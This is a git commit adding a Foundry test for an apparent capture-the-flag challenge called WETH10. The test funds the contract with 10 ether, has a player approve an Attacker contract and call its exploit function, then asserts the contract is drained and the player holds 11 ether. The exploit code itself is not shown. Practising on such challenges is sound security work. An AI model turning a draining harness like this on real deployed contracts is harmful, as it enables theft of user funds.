f2daef513cf5231b6db10449c8d68833de2f13a8
Maurizio Murru <maurizio.murru93@gmail.com>
2023-02-03 14:43:55 +0100

    weth 10 tests

---
+++ test/weth10.t.sol
@@ -0,0 +1,45 @@
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "../src/Counter.sol";
+import "../src/weth10.sol";
+import "../src/Attacker.sol";
+
+contract Weth10Test is Test {
+    WETH10 public weth;
+    Attacker public attacker;
+    UserReceiver public userReceiver;
+    address owner;
+    address bob;
+
+    function setUp() public {
+        weth = new WETH10();
+
+        userReceiver = new UserReceiver(payable(address(weth)));
+        bob = makeAddr("bob");
+        attacker = new Attacker(payable(address(weth)), payable(bob));
+
+        vm.deal(address(weth), 10 ether);
+        vm.deal(address(bob), 1 ether);
+    }
+
+    function testHack() public {
+        assertEq(
+            address(weth).balance,
+            10 ether,
+            "weth contract should have 10 ether"
+        );
+
+        vm.startPrank(bob);
+
+        // hack time!
+        weth.approve(address(attacker), 11 ether);
+        attacker.exploit{value:1 ether}();
+
+
+        vm.stopPrank();
+        console.logUint(address(weth).balance);
+        assertEq(address(weth).balance, 0, "empty weth contract");
+        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
+    }
+}
